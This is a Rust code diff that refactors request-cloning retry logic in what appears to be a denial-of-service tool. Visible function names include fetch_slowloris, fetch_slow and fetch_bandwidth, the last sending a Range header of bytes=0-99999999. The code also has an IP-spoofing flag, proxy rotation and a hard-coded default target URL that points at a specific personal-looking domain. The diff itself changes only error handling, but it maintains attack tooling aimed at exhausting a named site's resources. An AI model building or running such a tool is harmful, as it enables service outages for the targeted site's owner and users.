@@ -20,6 +20,24 @@ fn fetch_error_all_attempts_exhausted(name: &str) -> FetchError {
     FetchError::from(std::io::Error::other(format!("{name}: all attempts exhausted")))
 }
 
+async fn clone_request_builder_with_retry(
+    builder: &RequestBuilder,
+    name: &str,
+) -> Result<RequestBuilder, FetchError> {
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            return Ok(cloned);
+        }
+        eprintln!("[WARN] {name}: builder.try_clone() returned None (attempt {attempt})");
+        if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    Err(FetchError::from(std::io::Error::other(format!(
+        "{name}: builder.try_clone() returned None on final retry"
+    ))))
+}
+
 const DEFAULT_TARGET_URL: &str = "https://livdevries.com";
 
 static SPOOF_IP: AtomicBool = AtomicBool::new(false);
@@ -773,8 +791,8 @@ async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessio
     let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_page").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -788,16 +806,7 @@ async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessio
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_page: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_page: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -826,8 +835,8 @@ async fn fetch_page_with_referrer(
     let builder = add_session_cookie(builder, proxy_idx, &sessions);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_page_with_referrer").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -841,16 +850,7 @@ async fn fetch_page_with_referrer(
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_page_with_referrer: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_page_with_referrer: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -870,8 +870,8 @@ async fn fetch_range(c: Client, url: String, delay: u64, proxy_idx: usize, sessi
     let builder = add_session_cookie(builder, proxy_idx, &sessions);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_range").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -885,16 +885,7 @@ async fn fetch_range(c: Client, url: String, delay: u64, proxy_idx: usize, sessi
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_range: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_range: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -912,8 +903,8 @@ async fn fetch_slow(c: Client, url: String, delay: u64, proxy_idx: usize, sessio
     let builder = add_session_cookie(builder, proxy_idx, &sessions);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_slow").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -933,16 +924,7 @@ async fn fetch_slow(c: Client, url: String, delay: u64, proxy_idx: usize, sessio
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_slow: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_slow: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -964,8 +946,8 @@ async fn fetch_post(c: Client, url: String, delay: u64, proxy_idx: usize, sessio
     let builder = add_session_cookie(builder, proxy_idx, &sessions);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_post").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -979,16 +961,7 @@ async fn fetch_post(c: Client, url: String, delay: u64, proxy_idx: usize, sessio
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_post: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_post: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -1009,8 +982,8 @@ async fn fetch_cookie(c: Client, url: String, delay: u64, proxy_idx: usize, sess
     let builder = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_cookie").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -1024,16 +997,7 @@ async fn fetch_cookie(c: Client, url: String, delay: u64, proxy_idx: usize, sess
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_cookie: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_cookie: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -1060,8 +1024,8 @@ async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, s
     let builder = add_session_cookie(builder, proxy_idx, &sessions);
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_slowloris").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -1075,16 +1039,7 @@ async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, s
                     last_err = Some(e);
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_slowloris: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_slowloris: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
@@ -1105,8 +1060,8 @@ async fn fetch_bandwidth(c: Client, url: String, delay: u64, proxy_idx: usize, s
     let builder = builder.header(reqwest::header::RANGE, "bytes=0-99999999");
     let mut last_err = None;
     for attempt in 0..=2 {
-        if let Some(cloned) = builder.try_clone() {
-            match cloned.send().await {
+        match clone_request_builder_with_retry(&builder, "fetch_bandwidth").await {
+            Ok(cloned) => match cloned.send().await {
                 Ok(resp) => {
                     let status = resp.status().as_u16();
                     update_session_from_headers(proxy_idx, &sessions, resp.headers());
@@ -1126,16 +1081,7 @@ async fn fetch_bandwidth(c: Client, url: String, delay: u64, proxy_idx: usize, s
                     }
                 }
             }
-        } else {
-            eprintln!("[WARN] fetch_bandwidth: builder.try_clone() returned None (attempt {})", attempt);
-            if attempt < 2 {
-                tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                continue;
-            } else {
-                return Err(FetchError::from(std::io::Error::other(
-                    "fetch_bandwidth: builder.try_clone() returned None on final retry",
-                )));
-            }
+            Err(e) => return Err(e),
         }
     }
     match last_err {
